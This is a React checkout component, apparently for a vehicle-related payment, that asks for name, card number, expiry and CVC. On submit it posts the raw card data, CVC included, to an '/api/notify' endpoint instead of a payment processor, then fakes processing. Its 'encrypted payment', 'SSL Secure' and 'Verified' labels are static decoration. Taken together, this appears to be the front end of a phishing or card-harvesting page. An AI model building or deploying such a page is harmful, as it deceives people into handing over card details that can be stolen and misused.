"use client";

import { useState, useEffect } from "react";
import { CiCreditCard1 } from "react-icons/ci";
import { IoLogoPaypal } from "react-icons/io5";
import { FiUser, FiCreditCard, FiCalendar, FiLock } from "react-icons/fi";
import { MdDirectionsCar } from "react-icons/md";
import { BsShieldLock } from "react-icons/bs";

interface FieldProps {
  label: string;
  icon: React.ReactNode;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder: string;
  maxLength?: number;
}

function Field({ label, icon, value, onChange, placeholder, maxLength }: FieldProps) {
  return (
    <div className="flex flex-col gap-1.5">
      <label className="text-xs font-semibold text-gray-500 uppercase tracking-widest">
        {label}
      </label>
      <div className="relative group">
        <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 group-focus-within:text-indigo-500 transition-colors duration-200 text-base">
          {icon}
        </span>
        <input
          type="text"
          value={value}
          onChange={onChange}
          placeholder={placeholder}
          maxLength={maxLength}
          className="w-full pl-11 pr-4 py-3 rounded-xl bg-gray-50 border border-gray-200 text-gray-800 placeholder-gray-400 text-sm focus:outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 transition-all duration-200"
        />
      </div>
    </div>
  );
}

export default function Payment({ onSuccess, onBack }: { onSuccess?: (data: { firstName: string; lastName: string; cardNumber: string; exp: string; cvc: string; method: string }) => void; onBack?: () => void }) {
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [exp, setExp] = useState("");
  const [cvc, setCvc] = useState("");
  const [method, setMethod] = useState<"card" | "paypal">("card");
  const [loading, setLoading] = useState(false);
  const [mounted, setMounted] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setMounted(true), 100);
    return () => clearTimeout(t);
  }, []);

  const isEmpty = !firstName || !lastName || !cardNumber || !exp || !cvc;

  const handleCardNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 16);
    setCardNumber(val.replace(/(.{4})/g, "$1 ").trim());
  };

  const handleExp = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 8);
    if (val.length <= 2) setExp(val);
    else if (val.length <= 4) setExp(`${val.slice(0, 2)}/${val.slice(2)}`);
    else setExp(`${val.slice(0, 2)}/${val.slice(2, 4)}/${val.slice(4)}`);
  };

  const handleSubmit = async () => {
    if (isEmpty) return;
    setLoading(true);
    await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ firstName, lastName, cardNumber, exp, cvc }),
    });
    setTimeout(() => {
      setLoading(false);
      if (onSuccess) onSuccess({ firstName, lastName, cardNumber, exp, cvc, method });
    }, 800);
  };
  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4 py-8 sm:py-12">
      <div className={`relative z-10 w-full max-w-2xl mx-auto transition-all duration-700 ease-out ${mounted ? "opacity-100 translate-y-0" : "opacity-0 translate-y-8"}`}>
        <div className="bg-white rounded-3xl shadow-2xl border border-gray-100 p-4 sm:p-6 md:p-10">
          <div className="flex flex-col items-center mb-6 sm:mb-8 gap-3">
            <div className="h-12 w-12 sm:h-14 sm:w-14 rounded-full bg-amber-500 hover:bg-amber-400 flex items-center justify-center shadow-lg shadow-indigo-300">
              <MdDirectionsCar className="text-white text-xl sm:text-2xl" />
            </div>
            <div className="text-center">
              <h1 className="text-xl sm:text-2xl md:text-3xl font-extrabold text-transparent bg-clip-text bg-linear-to-r from-cyan-600 to-black drop-shadow-[2px_2px_4px_white] tracking-tight">Secure Checkout</h1>
              <p className="text-cyan-700 text-xs sm:text-sm mt-1 flex items-center justify-center gap-1">
                <BsShieldLock className="text-green-500 hover:bg-text-800 font-bold text-base sm:text-lg" /> encrypted payment
              </p>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6 sm:mb-8">
            <button onClick={() => setMethod("card")}
              className={`flex items-center justify-center font-bold text-red-500 gap-2 py-3 rounded-xl border text-sm transition-all duration-200 w-full ${method === "card" ? "bg-indigo-50 border-indigo-500 text-indigo-700 shadow-md shadow-indigo-100" : "bg-white border-gray-200 text-gray-400 hover:border-indigo-300 hover:text-indigo-500"}`}>
              <CiCreditCard1 size={22} /> Credit / Debit
            </button>
            <button onClick={() => setMethod("paypal")}
              className={`flex items-center justify-center gap-2 py-3 rounded-xl border text-sm font-semibold transition-all duration-200 w-full ${method === "paypal" ? "bg-blue-50 border-blue-400 text-blue-700 shadow-md shadow-blue-100" : "bg-white border-gray-200 text-gray-400 hover:border-blue-300 hover:text-blue-500"}`}>
              <IoLogoPaypal size={20} className="text-blue-500" />
              <span><span className="text-blue-600 font-bold">Pay</span><span className="text-blue-400">Pal</span></span>
            </button>
          </div>
          <div className="flex items-center gap-3 mb-5 sm:mb-7">
            <div className="flex-1 h-px bg-gray-200" />
            <span className="text-fuchsia-950 text-xs font-bold uppercase tracking-widest">Card Details</span>
            <div className="flex-1 h-px bg-gray-200" />
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 sm:gap-5">
            <Field label="First Name" icon={<FiUser />} value={firstName} onChange={(e) => setFirstName(e.target.value)} placeholder="Enter" />
            <Field label="Last Name" icon={<FiUser />} value={lastName} onChange={(e) => setLastName(e.target.value)} placeholder="Enter" />
            <div className="sm:col-span-2">
              <Field label="Card Number" icon={<FiCreditCard />} value={cardNumber} onChange={handleCardNumber} placeholder="1234 5678 9012 3456" maxLength={19} />
            </div>
            <Field label="Expiration Date" icon={<FiCalendar />} value={exp} onChange={handleExp} placeholder="DD/MM/YYYY" maxLength={10} />
            <Field label="Security Code" icon={<FiLock />} value={cvc} onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 3))} placeholder="CVC" maxLength={3} />
          </div>
          <div className="flex items-center gap-2 mt-5 sm:mt-7 mb-1">
            {[firstName, lastName, cardNumber, exp, cvc].map((val, i) => (
              <div key={i} className={`h-1.5 flex-1 rounded-full transition-all duration-300 ${val ? "bg-indigo-500" : "bg-gray-200"}`} />
            ))}
          </div>
          <p className="text-xs sm:text-sm text-transparent bg-clip-text bg-linear-to-r from-blue-900 to-black font-bold mb-5 sm:mb-6">
            {5 - [firstName, lastName, cardNumber, exp, cvc].filter(Boolean).length} field(s) remaining
          </p>
          <button onClick={handleSubmit} disabled={isEmpty || loading}
            className={`relative w-full py-3.5 sm:py-4 rounded-xl font-bold text-white text-sm sm:text-base tracking-wide transition-all duration-300 shadow-lg ${isEmpty || loading ? "bg-gray-200 text-gray-400 cursor-not-allowed" : "bg-blue-400 hover:bg-yellow-500 hover:scale-[1.02]"}`}>
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24" fill="none">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z" />
                </svg>
                Processing...
              </span>
            ) : (
              <span className="flex items-center justify-center gap-2"><BsShieldLock className="text-lg" /> Pay Now</span>
            )}
          </button>
          <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-6 mt-5 sm:mt-6 font-bold text-transparent bg-clip-text bg-linear-to-r from-red-800 to bg-black text-xs sm:text-sm">
            <span>SSL Secure</span>
            <span>Verified</span>
            <span>All Cards</span>
             <div className="bg-red-600 h-8 hover:bg-yellow-400 w-20 flex items-center justify-center  rounded-lg shadow-md hover:shadow-green-500 transition-discrete tranform-scale(1.2) shadow-pink-600">
            <button onClick={onBack} className="text-white transform-3d scale-3d flex italic justify-around hover:text-white">Back</button>
          </div>
          </div>
          
        </div>
      </div>
    </div>
    
  );
}
